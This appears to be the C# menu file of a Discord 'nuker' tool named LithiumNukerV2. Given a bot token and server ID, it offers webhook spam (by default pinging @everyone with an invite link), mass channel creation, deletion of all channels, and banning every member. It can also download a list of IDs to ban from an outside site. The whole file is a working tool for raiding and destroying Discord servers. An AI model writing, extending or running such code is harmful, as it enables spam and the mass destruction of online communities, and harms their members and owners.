// System
using System;
using System.Drawing;
using System.Text.RegularExpressions;
using System.Threading;
using System.IO;
using System.Net;

// Custom
using Veylib.CLIUI;
using LithiumCore;

namespace LithiumNukerV2
{
    internal class Picker
    {
        public static Core core = Core.GetInstance();

        // Components
        private static Channels channels;
        private static Webhooks webhooks;
        private static Users users;
        private static Bot bot = new Bot();
        private static bool pause = false;

        public static void Choose()
        {
            EnterToken:

            // Clear console
            core.Clear();

            // Regex format for bot tokens
            var regex = new Regex(@"[\w-]{24}.[\w-]{6}.[\w-]{27}");

            string token = Settings.Token;

            // If the token is null, prompt for input
            if (token == null)
                token = core.ReadLine("Bot token : ");

            // See if the token matches the regex pattern
            if (regex.Match(token).Length == 0)
            {
                core.WriteLine(Color.Red, "Input does not conform to token format.");
                core.Delay(2500);
                goto EnterToken;
            }
            else
            {
                // Test token
                if (!bot.TestToken(token))
                {
                    core.WriteLine(Color.Red, "Invalid bot token.");
                    core.Delay(2500);
                    goto EnterToken;
                }
                else
                {
                    // Disable because bugs and i got more pressin shit
                    //var saveToken = core.ReadLine("Save token? [Y/n] ");
                    //if (saveToken == "" || saveToken.ToLower() == "y")
                    //{
                    //    // Save the token to registry
                    //    key.SetValue("BotToken", token);
                    //    key.Close();
                    //}
                    Settings.Token = token;
                }
            }

            bool success = Settings.GuildId != null;
            long gid;

            EnterGuildId:

            // Clear console
            core.Clear();

            // Try to parse the input as a long
            if (!success)
                success = long.TryParse(core.ReadLine("Guild ID : "), out gid);
            else
                gid = (long)Settings.GuildId;
    
            if (!success)
            {
                core.WriteLine(Color.Red, "Guild ID couldn't be parsed.");
                core.Delay(2500);
                goto EnterGuildId;
            } else
            {
                // Check if its in the guild, if not, write out
                if (!bot.IsInGuild(Settings.Token, gid))
                {
                    core.WriteLine(Color.Red, "Bot is not in guild.");
                    core.Delay(2500);
                    goto EnterGuildId;
                }
                else
                    Settings.GuildId = gid;
            }

            // Setup new instances
            channels = new Channels(Settings.Token, (long)Settings.GuildId, Settings.Threads);
            webhooks = new Webhooks(Settings.Token, (long)Settings.GuildId, Settings.Threads);
            users = new Users(Settings.Token, (long)Settings.GuildId, Settings.Threads);

            Channels.Finished += () => { pause = false; };
            Webhooks.Finished += () => { pause = false; };
            Users.Finished += () => { pause = false; };

            // Create versions table
            var vertable = new AsciiTable(new AsciiTable.Properties { Colors = new AsciiTable.ColorProperties { RainbowDividers = true } });
            vertable.AddColumn($"Version - {LithiumShared.GetVersion()}");
            vertable.AddColumn($"Core version - {LithiumShared.GetVersion(typeof(Bot).Assembly)}");

            // Create options table
            var optable = new AsciiTable(new AsciiTable.Properties { Colors = new AsciiTable.ColorProperties { RainbowDividers = true } });
            optable.AddColumn("1 - Webhook spam channels");
            optable.AddColumn("2 - Create channels");
            optable.AddColumn("3 - Delete channels");
            optable.AddRow("4 - Ban members");

            while (true)
            {
                while (pause)
                    Thread.Sleep(20);

                // Clear console
                core.Clear();

                // Print tables
                vertable.WriteTable();
                optable.WriteTable();

                // Get the choice
                var choice = core.ReadLine("Choice : ");

                // Parse the input as an int
                if (!int.TryParse(choice, out int ch))
                {
                    core.WriteLine("Invalid choice");
                    core.Delay(2500);
                    continue;
                }

                pause = true;

                // Actually check input
                switch (ch)
                {
                    case 1:
                        whSpam();
                        break;
                    case 2:
                        createChans();
                        break;
                    case 3:
                        channels.Nuke();
                        break;
                    case 4:
                        banAll();
                        break;
                    default:
                        pause = false;
                        core.WriteLine("Invalid choice");
                        core.Delay(2500);
                        break;
                }

                core.Delay(2500);
            }
        }

        private static void whSpam()
        {
            // User input
            string content = core.ReadLine("Content : ");
            bool succ = int.TryParse(core.ReadLine("Amount of messages per webhook?"), out int amnt);

            if (!succ)
            {
                core.WriteLine(Color.Red, "Failed to parse amount of messages to an int");
                return;
            }

            // Auto fill content
            if (content == "")
                content = "@everyone discord.gg/lith";

            // Spam
            webhooks.Spam(Settings.WebhookName, Settings.AvatarUrl, content, amnt);
        }

        private static void createChans()
        {
            // User input
            string name = core.ReadLine("Channel name : ");
            string type = core.ReadLine("Type : [text, voice] ");
            bool succ = int.TryParse(core.ReadLine("Amount : "), out int amnt);

            if (!succ)
            {
                core.WriteLine(Color.Red, "Failed to parse amount to an int");
                return;
            }

            // Default to text
            if (type == "")
                type = "text";

            // Validate input
            if (type.ToLower() != "text" && type.ToLower() != "voice")
            {
                core.WriteLine(Color.Red, "Invalid channel type");
                return;
            }

            // Autofill name as this if blank
            if (name == "")
                name = "ran by lithium";

            // Spam
            channels.Spam(name, (Channels.Type)Enum.Parse(typeof(Channels.Type), type), amnt);

        }

        private static void banAll()
        {
            // User input
            string inp = core.ReadLine("Ban IDs : [y/N]");
            bool banIds;

            // Input parsing
            if (inp == "" || inp.ToLower() == "n")
                banIds = false;
            else
                banIds = true;

            // If banning ids, download the ids
            if (banIds && !File.Exists("ids.txt"))
                new WebClient().DownloadFile("https://lithium.verlox.cc/app/ids.txt", "ids.txt");

            users.BanAll(banIds);
        }
    }
}
